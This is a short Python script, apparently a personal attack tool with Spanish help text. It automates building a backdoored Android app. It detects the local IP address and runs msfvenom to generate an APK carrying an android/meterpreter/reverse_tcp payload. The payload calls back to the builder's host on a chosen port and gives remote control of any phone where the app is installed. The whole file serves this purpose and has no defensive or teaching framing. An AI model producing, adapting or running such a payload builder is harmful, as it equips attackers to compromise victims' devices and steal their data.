import socket
import argparse
from subprocess import Popen, PIPE, STDOUT

class prepareHandler:
    def __init__(self):
        import subprocess    
        cmd_line = "echo Hello!"
        p = subprocess.Popen(cmd_line, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        out = p.communicate()[0]
        print out

class createAPK:
    def get_ip_address(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    
    def launchProcess(self,command):
        p = Popen(command, stdout = PIPE, 
            stderr = STDOUT, shell = True)
        for line in p.stdout:
            print line.replace('\n', '')
        return 0
    
    def create(self, app_name, lp):
        
        ipl = self.get_ip_address()
        print ipl
        com = "msfvenom -p android/meterpreter/reverse_tcp LHOST="+ipl+" LPORT="+lp[0]+" R >"+app_name[0]+".apk"
        
        self.launchProcess(com)
        
##PARSER SHIT
parser = argparse.ArgumentParser(description='Testing')
        #parser.add_argument('ip_remota', metavar='ipr', type=str, nargs='+',
                            #help='ip remota')
parser.add_argument('app_name', metavar='name', type=str, nargs='+',
                    help='nombre de la app')
parser.add_argument('lp', metavar='lp', type=str, nargs='+',
                    help='local port')
args = parser.parse_args()
##//PARSER SHIT---------

Handler = prepareHandler()

APK = createAPK()
APK.create(args.app_name, args.lp)